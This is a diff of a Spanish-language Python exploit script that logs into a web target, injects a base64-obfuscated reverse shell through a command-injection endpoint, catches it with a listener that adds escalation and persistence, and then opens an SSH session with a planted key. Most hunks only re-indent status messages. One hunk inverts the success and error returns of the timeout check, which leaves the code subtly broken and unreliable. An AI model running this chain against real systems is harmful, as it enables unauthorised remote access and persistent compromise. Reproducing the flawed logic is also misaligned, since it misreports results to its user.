@@ -51,8 +51,8 @@ def ejecutar_comando(endpoint, payload):
         sesion.post(endpoint, data=PAYLOAD_RSHELL, timeout=3)
     # Capturamos el timeout, que significa exito!
     except requests.exceptions.ReadTimeout:
-        return '[+] Reverse Shell ejecutada (Timeout...).'
-    return '[-] Error: El comando no provocó Timeout.'
+        return 'Error: El comando no provocó Timeout.'
+    return 'Reverse Shell ejecutada (Timeout...).'
 
 # Funcion para escuchar la reverse shell y ejecutar comandos de escalada y persistencia
 def listener(puerto, verbose=False):
@@ -66,13 +66,13 @@ def listener(puerto, verbose=False):
     s.listen(1)
     
     if verbose:
-        print(f'[V] (Hilo Secundario) Escuchando en el puerto {puerto}...')
+        print(f'    [V] (Hilo Secundario) Escuchando en el puerto {puerto}...')
 
     # Esperamos a la victima (bloqueo hasta recibir la llamada de la revshell)
     conexion, direccion = s.accept()
 
     if verbose:
-        print(f'[V] (Hilo Secundario) ¡Shell capturada desde {direccion[0]}!')
+        print(f'    [V] (Hilo Secundario) ¡Shell capturada desde {direccion[0]}!')
 
     #-------------------------------------------[Fase 3: Escalada y Persistencia]-------------------------------------------------------
 
@@ -97,7 +97,7 @@ def listener(puerto, verbose=False):
     s.close() # Cerramos el socket
     
     if verbose:
-        print(f'[V] (Hilo Secundario) Configuración de persistencia inyectada con éxito.')
+        print(f'    [V] (Hilo Secundario) Configuración de persistencia inyectada con éxito.')
 
 #--------------------------------------------------------[Main]-----------------------------------------------------------------------
 
@@ -147,13 +147,13 @@ def main():
 #----------------------------------------------------[Fase 1: Login]------------------------------------------------------------------
 
     if args.verbose:
-        print(f'[V] Fase 1: Realizando los preparativos para el login en {args.target}...')
+        print(f'    [V] Fase 1: Realizando los preparativos para el login en {args.target}...')
 
     # Definimos el endpoint de login en una variable
     login_endpoint = f'http://{args.target}/login.php'
     
     if args.verbose:
-        print(f'[V] Lanzando petición POST con credenciales hacia {login_endpoint}...')
+        print(f'    [V] Lanzando petición POST con credenciales hacia {login_endpoint}...')
     
     # Intentamos conectar con el servidor y guardamos la respuesta en respuesta_login
     try:
@@ -166,7 +166,7 @@ def main():
     if respuesta_login.status_code == 200 and 'Command Panel' in respuesta_login.text:
         print('[+] ¡Conexión exitosa con el servidor!')
         if args.verbose: # Si el verbose esta activo, imprimimos las cookies de sesion
-            print(f'[V] Cookies de sesión obtenidas: {sesion.cookies.get_dict()}')
+            print(f'    [V] Cookies de sesión obtenidas: {sesion.cookies.get_dict()}')
     else:
         print('[-] Error: Login rechazado (credenciales invalidas u objetivo no alcanzable)')
         return
@@ -174,7 +174,7 @@ def main():
 #-----------------------------------------------------[Fase 2: RCE]-------------------------------------------------------------------
 
     if args.verbose:
-        print(f'\n[V] Fase 2: Configurando el ataque (Reverse Shell y Listener)')
+        print(f'    [V] Fase 2: Configurando el ataque (Reverse Shell y Listener)')
 
     # Definimos el endpoint de RCE en una variable
     rce_endpoint = f'http://{args.target}/portal.php'
@@ -185,7 +185,7 @@ def main():
     time.sleep(1) # Esperamos 1 segundo para evitar problemas con el socket
     
     if args.verbose:
-        print(f'[V] Invocando payload del archivo payload.py y ofuscándolo hacia {args.lhost}:{args.lport}...')
+        print(f'    [V] Invocando payload del archivo payload.py y ofuscándolo hacia {args.lhost}:{args.lport}...')
 
     # Llamamos a la funcion reverse_shell del modulo payload y guardamos el resultado en payload_raw
     payload_raw = payload.reverse_shell(args.lhost, args.lport)
@@ -195,29 +195,30 @@ def main():
     payload_cmd = f"echo '{payload_base64}' | base64 -d | bash" 
     
     if args.verbose:
-        print(f'[V] Inyectando RCE en {rce_endpoint}...')
+        print(f'    [V] Inyectando RCE en {rce_endpoint}...')
 
     # Ejecutamos el comando en el servidor para inyectar el payload y obtener la shell
     resultado_rce = ejecutar_comando(rce_endpoint, payload_cmd)
     
     if args.verbose:
-        print(f'[V] {resultado_rce}')
-        print(f'[V] Esperando a que el Listener termine de inyectar los comandos...')
+        print(f'    [V] {resultado_rce}')
+        print(f'    [V] Esperando a que el Listener termine de inyectar los comandos...')
         
     # Esperamos a que termine la conexion en segundo plano del listener (ejecucion de todos los comandos)
     hilo.join()
-    
-    print('[+] Fase 2: Completada. Arquitectura Múltiple (Main y Listener).')
+
+    if args.verbose:
+        print('    [V] Fase 2: Completada. Arquitectura Múltiple (Main y Listener).')
 
 #--------------------------------------------------[Fase 3: Auto-SSH]-----------------------------------------------------------------
 
     if args.verbose:
-        print(f'\n[V] Fase 3: Auto-configurando cliente nativo para acceso interactivo...')
+        print(f'    [V] Fase 3: Auto-configurando cliente nativo para acceso interactivo...')
 
     # Damos permisos a la llave privada para que SSH pueda leerla y no de error
     os.chmod(PATH_LLAVE, 0o600) 
     
-    print('[+] Operación terminada. Inicializando consola interactiva SSH (gacker)...\n')
+    print('[+] Operación terminada. Inicializando consola interactiva SSH (gacker)...')
     print('=' * 50 + '\n')
     
     # Conectamos directamente al SSH. Añadimos StrictHostKeyChecking para evitar que pregunte si queremos conectar con el host
